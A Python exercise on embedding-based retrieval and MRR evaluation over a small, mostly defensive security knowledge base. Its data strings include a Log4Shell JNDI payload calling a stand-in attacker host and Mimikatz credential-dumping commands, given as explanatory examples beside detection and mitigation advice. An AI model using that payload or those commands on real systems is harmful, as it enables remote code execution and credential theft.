# Exercise 2 — Retrieval: Finding Relevant Chunks
#
# Builds a vector index from a security knowledge base, retrieves
# the most relevant chunks for a query using cosine similarity,
# and evaluates retrieval quality with Mean Reciprocal Rank (MRR).
#
# Requires: pip install sentence-transformers
# No API key required.

import re
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer


# ============================================================
#   Knowledge Base and Queries
# ============================================================

KNOWLEDGE_BASE = {
    "mimikatz": """
Mimikatz extracts plaintext passwords and NTLM hashes from Windows LSASS memory.
Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden for Golden Ticket attacks.
Detection: monitor LSASS memory access by non-system processes using Sysmon Event ID 10.
Unexpected lsass.exe access from procdump, taskmgr, or unsigned binaries triggers high alerts.
Mitigations: Credential Guard, disable WDigest, Protected Users group, LSA Protection.
Enable audit policies for privilege use; baseline normal dcsync behaviour.
""",
    "log4shell": """
CVE-2021-44228 Log4Shell is a critical RCE vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged HTTP field.
Exploitable via User-Agent, X-Forwarded-For, or any parameter that gets logged.
No authentication required; CVSS score 10.0.
Remediation: upgrade to Log4j 2.17.1 or later.
Mitigation: set -Dlog4j2.formatMsgNoLookups=true.
Detection: outbound LDAP from application servers; jndi patterns in web access logs.
""",
    "ransomware": """
Ransomware incident response: Phase 1 (0-30 min) confirm indicators and identify Patient Zero.
Do NOT reboot infected machines — memory forensics may be needed.
Phase 2 (30 min to 2 hr): isolate via VLAN not shutdown, disable compromised accounts, block C2 at perimeter.
Phase 3 (2-24 hr): remove persistence mechanisms, reset all credentials, patch initial access vector.
Phase 4 (1-7 days): restore from clean backups, prioritise critical systems, monitor for re-infection.
Phase 5: root cause analysis, update detection rules, test backup integrity.
""",
    "lateral_movement": """
Lateral movement allows attackers to progressively move through a network after initial compromise.
Detect via SMB authentication anomalies (Event ID 4624 type 3), unusual RDP connections.
PsExec and WMI remote execution are common lateral movement tools; monitor process creation.
Pass-the-Hash attacks reuse NTLM hashes without knowing plaintext passwords.
Baseline normal admin behaviour to distinguish legitimate from malicious activity.
Alert on admin tools appearing on non-admin workstations.
""",
    "phishing": """
Phishing emails impersonate trusted entities to steal credentials or deliver malware.
Identify phishing by checking SPF, DKIM, and DMARC alignment in email headers.
Inspect sender domain age and URL redirect chains for suspicious redirects.
Hash attachments and check against VirusTotal; sandbox unknown executables.
Spear-phishing targets specific individuals using OSINT from LinkedIn and social media.
Business Email Compromise (BEC) uses lookalike domains and urgency to bypass scrutiny.
""",
    "network_segmentation": """
Network segmentation limits lateral movement by dividing infrastructure into isolated zones.
DMZ hosts internet-facing services; separate VLAN for OT and ICS systems; isolated network for domain controllers.
Zero-trust architecture verifies every request and assumes breach at all times.
Microsegmentation uses host-based firewall rules to restrict east-west traffic.
VLAN-based segmentation is fast to implement; SDN-based microsegmentation scales better.
Document all segment boundaries and authorised communication paths in a network diagram.
""",
}

QUERIES = [
    "how to detect LSASS memory access by attackers?",
    "what steps to take when ransomware is detected?",
    "how to limit attacker movement between network zones?",
]

# Overlap chunking helper (reproduced from Exercise 1 for standalone use)
def chunk_overlap(text, chunk_size=60, overlap=15):
    words = text.split()
    step = chunk_size - overlap
    chunks = []
    for i in range(0, len(words), step):
        chunk = " ".join(words[i:i + chunk_size])
        if len(chunk.split()) >= 10:
            chunks.append(chunk)
    return chunks


# ============================================================
#   TASK 1: Build the vector index
# ============================================================
print("=" * 60)
print("  TASK 1: Build the Vector Index")
print("=" * 60)

# Load the embedding model
model = SentenceTransformer("all-MiniLM-L6-v2")

# Chunk all documents and track which doc each chunk came from
all_chunks = []
for doc_id, text in KNOWLEDGE_BASE.items():
    for chunk in chunk_overlap(text):
        all_chunks.append((doc_id, chunk))

# Encode all chunks into a single embedding matrix
chunk_texts = [c[1] for c in all_chunks]
index = model.encode(chunk_texts)

print(f"\nChunked {len(KNOWLEDGE_BASE)} documents -> {len(all_chunks)} chunks")
print(f"Vector index shape: {index.shape}")


# ============================================================
#   TASK 2: Implement the retrieve function
# ============================================================
print("\n" + "=" * 60)
print("  TASK 2: Retrieve Relevant Chunks")
print("=" * 60)

# Encode the query, compute cosine similarity against all chunks,
# return the top k results sorted by relevance descending.
def retrieve(query, top_k=3):
    query_emb = model.encode([query])
    sims = cosine_similarity(query_emb, index)[0]
    top_indices = np.argsort(sims)[::-1][:top_k]
    return [(float(sims[i]), all_chunks[i][0], all_chunks[i][1]) for i in top_indices]


# ============================================================
#   TASK 3: Run queries and print ranked results
# ============================================================
print("\n" + "=" * 60)
print("  TASK 3: Query Results")
print("=" * 60)

# The relevant document should appear at rank 1 for each query
print()
for query in QUERIES:
    results = retrieve(query, top_k=3)
    print(f"Query: {query}")
    for score, doc_id, chunk in results:
        print(f"  {score:.4f} | {doc_id:<22} | {chunk[:80]}...")
    print()


# ============================================================
#   TASK 4 (Bonus): Mean Reciprocal Rank evaluation
# ============================================================
print("=" * 60)
print("  TASK 4 (Bonus): MRR Evaluation")
print("=" * 60)

# MRR measures retrieval quality: for each query, find the rank
# of the first correct result. Average the reciprocals (1/rank).
# MRR of 1.0 means the correct document was always at rank 1.
CORRECT_DOCS = {
    QUERIES[0]: "mimikatz",
    QUERIES[1]: "ransomware",
    QUERIES[2]: "network_segmentation",
}

reciprocal_ranks = []
for query, correct in CORRECT_DOCS.items():
    results = retrieve(query, top_k=5)
    rr = 0.0
    for rank, (score, doc_id, chunk) in enumerate(results, 1):
        if doc_id == correct:
            rr = 1.0 / rank
            break
    reciprocal_ranks.append(rr)
    print(f"Query: {query[:55]:<55} | correct={correct:<22} | RR={rr:.2f}")

mrr = sum(reciprocal_ranks) / len(reciprocal_ranks)
print(f"\nMean Reciprocal Rank (MRR): {mrr:.4f}  (target >= 0.80)")

print("\n--- Exercise 2 complete. Move to 03_solution_rag_pipeline.py ---")
